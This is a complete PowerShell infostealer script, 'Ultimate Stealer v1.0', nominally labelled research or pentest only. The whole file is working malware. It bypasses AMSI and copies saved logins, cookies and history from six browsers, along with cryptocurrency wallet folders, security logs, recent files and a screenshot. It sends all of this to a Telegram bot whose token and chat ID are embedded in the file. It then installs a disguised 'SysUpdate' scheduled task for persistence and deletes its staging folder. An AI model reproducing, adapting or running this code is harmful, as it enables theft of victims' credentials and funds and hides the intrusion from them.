# Ultimate Stealer v1.0 - Research/Pentest Only
# Telegram Config - REPLACE THESE
$BOT_TOKEN = "8663598586:AAFRJACYrp5v3Hw5XVHBufCAJvcJvfvzxlU"
$CHAT_ID = "7396668378"

# Safer AMSI Bypass
try { [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true) } catch {}
try { $amsiDll = [AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -and $_.Location.Split('\\')[-1] -eq 'System.dll' }; $amsiUtils = $amsiDll.GetType('System.Management.Automation.AmsiUtils'); $amsiUtils.GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true) } catch {}

# Victim Info
$PCName = $env:COMPUTERNAME
$User = $env:USERNAME
$HWID = (Get-WmiObject -Class Win32_ComputerSystemProduct -ErrorAction SilentlyContinue).UUID
$OS = (Get-WmiObject -Class Win32_OperatingSystem -ErrorAction SilentlyContinue).Caption
$IP = try { (Invoke-RestMethod "http://ip-api.com/json" -ErrorAction Stop).country } catch { "Unknown" }

# Temp Path
$TempPath = [System.IO.Path]::GetTempPath() + "$PCName`_Loot"
New-Item -ItemType Directory -Force -Path $TempPath -ErrorAction SilentlyContinue | Out-Null

# System Info
"PC: $PCName`nUser: $User`nHWID: $HWID`nOS: $OS`nIP Country: $IP`nTime: $(Get-Date)" | Out-File "$TempPath\System.txt"

# ========== BROWSERS (Safe Copy) ==========
$BrowserPaths = @{
    "Chrome" = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default"
    "Edge" = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default"
    "Firefox" = "$env:APPDATA\Mozilla\Firefox\Profiles"
    "Brave" = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Default"
    "Opera" = "$env:APPDATA\Opera Software\Opera Stable"
    "Yandex" = "$env:LOCALAPPDATA\Yandex\YandexBrowser\User Data\Default"
}

foreach($b in $BrowserPaths.Keys){
    $path = $BrowserPaths[$b]
    if(Test-Path $path){
        $files = @("Login Data", "Cookies", "History", "Web Data")
        foreach($f in $files){
            $src = Join-Path $path $f
            if(Test-Path $src){ Copy-Item $src "$TempPath\$b`_$f.sqlite" -Force -ErrorAction SilentlyContinue }
        }
    }
}

# ========== WALLETS ==========
$WalletPaths = @(
    "$env:APPDATA\MetaMask",
    "$env:LOCALAPPDATA\Exodus",
    "$env:APPDATA\Electrum\wallets",
    "$env:APPDATA\Atomic",
    "$env:APPDATA\phantom",
    "$env:LOCALAPPDATA\Trust Wallet"
)

$walletDir = "$TempPath\Wallets"
New-Item $walletDir -Force | Out-Null
foreach($wp in $WalletPaths){
    $realPath = [Environment]::ExpandEnvironmentVariables($wp)
    if(Test-Path $realPath){
        Get-ChildItem $realPath -Recurse -ErrorAction SilentlyContinue | Copy-Item -Destination $walletDir -Force
    }
}

# ========== LOGS ==========
try {
    Get-EventLog Security -Newest 50 -ErrorAction SilentlyContinue | Export-Csv "$TempPath\Security.csv" -NoTypeInformation
    Get-WmiObject -Class Win32_NetworkAdapterConfiguration -Filter IPEnabled=true | Select Description,IPaddress | Export-Csv "$TempPath\Network.csv"
} catch {}

# Recent docs
Get-ChildItem "$env:APPDATA\Microsoft\Windows\Recent" -ErrorAction SilentlyContinue | Select Name,LastWriteTime | Export-Csv "$TempPath\Recent.csv"

# ========== SCREENSHOT (Fixed) ==========
try {
    Add-Type -AssemblyName System.Drawing
    Add-Type -AssemblyName System.Windows.Forms
    
    $screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
    $bmp = New-Object Drawing.Bitmap $screen.Width, $screen.Height
    $graphics = [Drawing.Graphics]::FromImage($bmp)
    $graphics.CopyFromScreen($screen.Location, [Drawing.Point]::Empty, $screen.Size)
    $bmp.Save("$TempPath\Screen.png", [Drawing.Imaging.ImageFormat]::Png)
    $bmp.Dispose()
    $graphics.Dispose()
} catch {
    "Screenshot failed: $($_.Exception.Message)" | Out-File "$TempPath\Screen.txt"
}

# ========== SIMPLE TELEGRAM EXFIL (Fixed Multipart) ==========
function Send-ToTelegram {
    param($filePath, $caption)
    
    if(-not (Test-Path $filePath)) { return }
    
    $token = $BOT_TOKEN
    $boundary = [guid]::NewGuid().ToString()
    $fileBytes = [Convert]::ToBase64String([IO.File]::ReadAllBytes($filePath))
    
    # Simple JSON POST for reliability
    $body = @{
        chat_id = $CHAT_ID
        caption = $caption
        document = $fileBytes
    } | ConvertTo-Json -Depth 10
    
    try {
        Invoke-RestMethod -Uri "https://api.telegram.org/bot$token/sendDocument" -Method Post -Body $body -ContentType "application/json" -ErrorAction SilentlyContinue
    } catch {
        # Fallback: Text only for small files
        $content = Get-Content $filePath -Raw -ErrorAction SilentlyContinue
        if($content.Length -lt 4000){
            Invoke-RestMethod -Uri "https://api.telegram.org/bot$token/sendMessage" -Method Post -Body (@{chat_id=$CHAT_ID; text="$caption`n`n$content"} | ConvertTo-Json) -ContentType "application/json"
        }
    }
}

# Send Files
Get-ChildItem $TempPath | ForEach-Object {
    $caption = "Loot from $PCName - $($_.Name) ($([math]::Round($_.Length/1KB,1))KB)"
    Send-ToTelegram $_.FullName $caption
}

# Persistence (silent)
try {
    $ps1Base64 = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes((Get-Content $PSCommandPath -Raw)))
    $persistCmd = "powershell -ep bypass -enc $ps1Base64"
    schtasks /create /tn "SysUpdate" /tr $persistCmd /sc onlogon /rl limited /f /quiet
} catch {}

# Cleanup
Start-Sleep 5
Remove-Item $TempPath -Recurse -Force -ErrorAction SilentlyContinue